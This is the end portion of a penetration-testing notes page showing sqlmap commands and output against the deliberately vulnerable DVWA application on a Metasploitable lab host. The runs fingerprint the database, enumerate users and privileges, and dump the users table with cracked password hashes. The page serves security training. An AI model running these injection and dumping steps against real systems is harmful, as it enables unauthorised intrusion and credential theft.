+<span class="gp">hacker@kali:~$</span> sqlmap --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIES</span><span class="s2">&quot;</span> -u <span class="s2">&quot;</span><span class="si">${</span><span class="nv">URL_SQLI</span><span class="si">}</span><span class="s2">?id=1&amp;Submit=Submit&quot;</span> <span class="se">\</span>
+&gt;    --dbms mysql --batch --output-dir <span class="nv">$PWD</span>/sqlmap <span class="se">\</span>
+&gt;     --fingerprint --banner --current-user --is-dba --current-db --hostname
+<span class="go">... SNIP ...</span>
+<span class="go">web server operating system: Linux Ubuntu 8.04 (Hardy Heron)</span>
+<span class="go">web application technology: PHP 5.2.4, Apache 2.2.8</span>
+<span class="go">back-end DBMS operating system: Linux Ubuntu</span>
+<span class="go">back-end DBMS: active fingerprint: MySQL &gt;= 5.0.38 and &lt; 5.1.2</span>
+<span class="go">               comment injection fingerprint: MySQL 5.0.51</span>
+<span class="go">               banner parsing fingerprint: MySQL &gt;= 5.0.38 and &lt; 5.1.2</span>
+<span class="go">banner:    &#39;5.0.51a-3ubuntu5&#39;</span>
+<span class="go">[14:56:50] [INFO] fetching current user</span>
+<span class="go">current user:    &#39;root@%&#39;</span>
+<span class="go">[14:56:50] [INFO] fetching current database</span>
+<span class="go">current database:    &#39;dvwa&#39;</span>
+<span class="go">[14:56:50] [INFO] fetching server hostname</span>
+<span class="go">hostname:    &#39;metasploitable&#39;</span>
+<span class="go">[14:56:50] [INFO] testing if current user is DBA</span>
+<span class="go">[14:56:50] [INFO] fetching current user</span>
+<span class="go">current user is DBA:    True</span>
+<span class="go">... SNIP ...</span>
+
+<span class="gp">hacker@kali:~$</span>
+<span class="gp">hacker@kali:~$</span> sqlmap --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIES</span><span class="s2">&quot;</span> -u <span class="s2">&quot;</span><span class="si">${</span><span class="nv">URL_SQLI</span><span class="si">}</span><span class="s2">?id=1&amp;Submit=Submit&quot;</span> <span class="se">\</span>
+&gt;    --dbms mysql --batch --output-dir <span class="nv">$PWD</span>/sqlmap <span class="se">\</span>
+&gt;     --users --passwords --privileges --roles
+<span class="go">... SNIP ...</span>
+<span class="go">[15:04:10] [INFO] fetching database users</span>
+<span class="go">[15:04:10] [WARNING] reflective value(s) found and filtering out</span>
+<span class="go">database management system users [3]:</span>
+<span class="go">[*] &#39;debian-sys-maint&#39;@&#39;&#39;</span>
+<span class="go">[*] &#39;guest&#39;@&#39;%&#39;</span>
+<span class="go">[*] &#39;root&#39;@&#39;%&#39;</span>
+
+<span class="go">[15:04:10] [INFO] fetching database users password hashes</span>
+<span class="go">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N</span>
+<span class="go">do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] Y</span>
+<span class="go">[15:04:10] [WARNING] unknown hash format. Please report by e-mail to sqlmap-users@lists.sourceforge.net</span>
+<span class="go">[15:04:10] [WARNING] no clear password(s) found</span>
+<span class="go">database management system users password hashes:</span>
+<span class="go">[*] debian-sys-maint [1]:</span>
+<span class="go">    password hash: NULL</span>
+<span class="go">[*] guest [1]:</span>
+<span class="go">    password hash: NULL</span>
+<span class="go">[*] root [1]:</span>
+<span class="go">    password hash: NULL</span>
+
+<span class="go">[15:04:10] [INFO] fetching database users privileges</span>
+<span class="go">database management system users privileges:</span>
+<span class="go">[*] &#39;debian-sys-maint&#39;@&#39;&#39; (administrator) [20]:</span>
+<span class="go">    privilege: ALTER</span>
+<span class="go">... SNIP ...</span>
+<span class="go">    privilege: UPDATE</span>
+<span class="go">[*] &#39;guest&#39;@&#39;%&#39; (administrator) [25]:</span>
+<span class="go">    privilege: ALTER</span>
+<span class="go">... SNIP ...</span>
+<span class="go">    privilege: UPDATE</span>
+<span class="go">[*] &#39;root&#39;@&#39;%&#39; (administrator) [25]:</span>
+<span class="go">    privilege: ALTER</span>
+<span class="go">... SNIP ...</span>
+<span class="go">    privilege: UPDATE</span>
+
+<span class="go">[15:04:10] [WARNING] on MySQL the concept of roles does not exist. sqlmap will enumerate privileges instead</span>
+<span class="go">[15:04:10] [INFO] fetching database users privileges</span>
+<span class="go">database management system users roles:</span>
+<span class="go">[*] &#39;debian-sys-maint&#39;@&#39;&#39; (administrator) [20]:</span>
+<span class="go">    role: ALTER</span>
+<span class="go">... SNIP ...</span>
+<span class="go">    role: UPDATE</span>
+<span class="go">[*] &#39;guest&#39;@&#39;%&#39; (administrator) [25]:</span>
+<span class="go">    role: ALTER</span>
+<span class="go">... SNIP ...</span>
+<span class="go">    role: UPDATE</span>
+<span class="go">[*] &#39;root&#39;@&#39;%&#39; (administrator) [25]:</span>
+<span class="go">    role: ALTER</span>
+<span class="go">... SNIP ...</span>
+<span class="go">    role: UPDATE</span>
+<span class="go">... SNIP ...</span>
+
+<span class="gp">hacker@kali:~$</span> sqlmap --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIES</span><span class="s2">&quot;</span> -u <span class="s2">&quot;</span><span class="si">${</span><span class="nv">URL_SQLI</span><span class="si">}</span><span class="s2">?id=1&amp;Submit=Submit&quot;</span> <span class="se">\</span>
+&gt;    --dbms mysql --batch --output-dir <span class="nv">$PWD</span>/sqlmap <span class="se">\</span>
+&gt;    -D dvwa --tables
+<span class="go">... SNIP ...</span>
+<span class="go">[15:06:43] [INFO] fetching tables for database: &#39;dvwa&#39;</span>
+<span class="go">[15:06:44] [WARNING] reflective value(s) found and filtering out</span>
+<span class="go">Database: dvwa</span>
+<span class="go">[2 tables]</span>
+<span class="go">+-----------+</span>
+<span class="go">| guestbook |</span>
+<span class="go">| users     |</span>
+<span class="go">+-----------+</span>
+
+<span class="go">... SNIP ...</span>
+
+<span class="gp">hacker@kali:~$</span> sqlmap --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIES</span><span class="s2">&quot;</span> -u <span class="s2">&quot;</span><span class="si">${</span><span class="nv">URL_SQLI</span><span class="si">}</span><span class="s2">?id=1&amp;Submit=Submit&quot;</span> <span class="se">\</span>
+&gt;    --dbms mysql --batch --output-dir <span class="nv">$PWD</span>/sqlmap <span class="se">\</span>
+&gt;    -D dvwa --columns
+<span class="go">... SNIP ...</span>
+<span class="go">Database: dvwa</span>
+<span class="go">Table: users</span>
+<span class="go">[6 columns]</span>
+<span class="go">+------------+-------------+</span>
+<span class="go">| Column     | Type        |</span>
+<span class="go">+------------+-------------+</span>
+<span class="go">| user       | varchar(15) |</span>
+<span class="go">| avatar     | varchar(70) |</span>
+<span class="go">| first_name | varchar(15) |</span>
+<span class="go">| last_name  | varchar(15) |</span>
+<span class="go">| password   | varchar(32) |</span>
+<span class="go">| user_id    | int(6)      |</span>
+<span class="go">+------------+-------------+</span>
+
+<span class="go">Database: dvwa</span>
+<span class="go">Table: guestbook</span>
+<span class="go">[3 columns]</span>
+<span class="go">+------------+----------------------+</span>
+<span class="go">| Column     | Type                 |</span>
+<span class="go">+------------+----------------------+</span>
+<span class="go">| comment    | varchar(300)         |</span>
+<span class="go">| comment_id | smallint(5) unsigned |</span>
+<span class="go">| name       | varchar(100)         |</span>
+<span class="go">+------------+----------------------+</span>
+
+<span class="go">... SNIP ...</span>
+
+<span class="gp">hacker@kali:~$</span> sqlmap --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIES</span><span class="s2">&quot;</span> -u <span class="s2">&quot;</span><span class="si">${</span><span class="nv">URL_SQLI</span><span class="si">}</span><span class="s2">?id=1&amp;Submit=Submit&quot;</span> --dbms mysql --batch --output-dir <span class="nv">$PWD</span>/sqlmap <span class="se">\</span>
+&gt;         -D dvwa --dump
+<span class="go">... SNIP ...</span>
+<span class="go">Database: dvwa</span>
+<span class="go">Table: users</span>
+<span class="go">[5 entries]</span>
+<span class="go">+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+</span>
+<span class="go">| user_id | user    | avatar                                                | password                                    | last_name | first_name |</span>
+<span class="go">+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+</span>
+<span class="go">| 1       | admin   | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      |</span>
+<span class="go">| 2       | gordonb | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     |</span>
+<span class="go">| 3       | 1337    | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       |</span>
+<span class="go">| 4       | pablo   | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      |</span>
+<span class="go">| 5       | smithy  | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        |</span>
+<span class="go">+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+</span>
+
+<span class="go">[15:07:54] [INFO] table &#39;dvwa.users&#39; dumped to CSV file &#39;/home/jgm/.sqlmap/output/192.168.1.102/dump/dvwa/users.csv&#39;</span>
+<span class="go">[15:07:54] [INFO] fetching columns for table &#39;guestbook&#39; in database &#39;dvwa&#39;</span>
+<span class="go">[15:07:54] [INFO] fetching entries for table &#39;guestbook&#39; in database &#39;dvwa&#39;</span>
+<span class="go">[15:07:54] [INFO] analyzing table dump for possible password hashes</span>
+<span class="go">Database: dvwa</span>
+<span class="go">Table: guestbook</span>
+<span class="go">[1 entry]</span>
+<span class="go">+------------+------+-------------------------+</span>
+<span class="go">| comment_id | name | comment                 |</span>
+<span class="go">+------------+------+-------------------------+</span>
+<span class="go">| 1          | test | This is a test comment. |</span>
+<span class="go">+------------+------+-------------------------+</span>
+</pre></div>
+</div>
+</div>
+</div>
+
+
+           </div>
+           <div class="articleComments">
+            
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="from_sql_injection_to_shell_II.html" class="btn btn-neutral float-right" title="3.23. PentesterLab From SQL injection to Shell II" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="googles_xss_game.html" class="btn btn-neutral" title="3.21. Google’s XSS Game" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, bitbender.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.2',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
